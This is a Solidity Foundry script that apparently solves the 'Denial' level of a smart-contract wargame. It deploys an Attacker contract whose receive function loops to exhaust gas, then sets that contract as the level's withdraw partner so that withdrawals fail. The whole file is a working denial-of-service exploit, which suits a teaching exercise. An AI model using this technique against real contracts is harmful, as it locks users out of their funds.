// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Denial} from "../src/level19.sol";

contract Attacker {
    uint256 counter = 0;

    constructor() {}

    receive() external payable {
        for (uint256 i = 0; i < 2 ** 256 - 1; i++) {
            counter += 1;
        }
    }
}

contract CallContractScript is Script {
    function run() external {
        // 指定私钥，可以从环境变量中获取，例如：process.env.PRIVATE_KEY
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        // 初始化一个签名者
        vm.startBroadcast(privateKey);

        address levelAddr = 0x1536F390ACb7a8097903F2515b4EEb35a091a633;
        Denial level = Denial(payable(levelAddr));

        Attacker attacker = new Attacker();

        level.setWithdrawPartner(address(attacker));

        vm.stopBroadcast();
    }
}
